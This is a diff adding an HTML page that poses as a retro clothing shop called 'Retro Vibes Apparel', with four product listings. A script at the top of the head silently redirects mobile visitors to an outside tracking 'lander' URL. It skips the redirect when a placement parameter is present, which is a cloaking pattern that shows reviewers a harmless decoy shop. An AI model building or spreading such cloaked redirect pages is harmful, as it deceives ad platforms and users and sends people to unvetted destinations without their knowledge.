@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/7030fb24-f71e-4d19-916a-a1c232f79601?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Retro Vibes Apparel</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #ffd700;
+            color: #8b008b;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #ff69b4;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 2px 2px #00ffff;
+        }
+        nav {
+            background-color: #00ff00;
+            padding: 10px;
+        }
+        nav ul {
+            list-style-type: none;
+            padding: 0;
+        }
+        nav ul li {
+            display: inline;
+            margin-right: 20px;
+        }
+        nav ul li a {
+            color: #8b008b;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        main {
+            padding: 20px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+        }
+        .product {
+            background-color: #ff6347;
+            border: 3px solid #00ffff;
+            border-radius: 15px;
+            padding: 20px;
+            margin: 10px;
+            width: 200px;
+            text-align: center;
+        }
+        footer {
+            background-color: #ff69b4;
+            color: #8b008b;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Retro Vibes Apparel</h1>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="#home">Home</a></li>
+            <li><a href="#shop">Shop</a></li>
+            <li><a href="#about">About</a></li>
+            <li><a href="#contact">Contact</a></li>
+        </ul>
+    </nav>
+    <main>
+        <div class="product">
+            <h2>Neon Windbreaker</h2>
+            <p>Embrace the 80s with this vibrant windbreaker!</p>
+            <p>Price: $59.99</p>
+        </div>
+        <div class="product">
+            <h2>Acid Wash Jeans</h2>
+            <p>Classic acid wash jeans for that retro look!</p>
+            <p>Price: $79.99</p>
+        </div>
+        <div class="product">
+            <h2>Geometric Print Tee</h2>
+            <p>Bold geometric patterns on a comfy tee!</p>
+            <p>Price: $24.99</p>
+        </div>
+        <div class="product">
+            <h2>Fanny Pack</h2>
+            <p>Practical and stylish neon fanny pack!</p>
+            <p>Price: $19.99</p>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Retro Vibes Apparel. All rights reserved. | <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
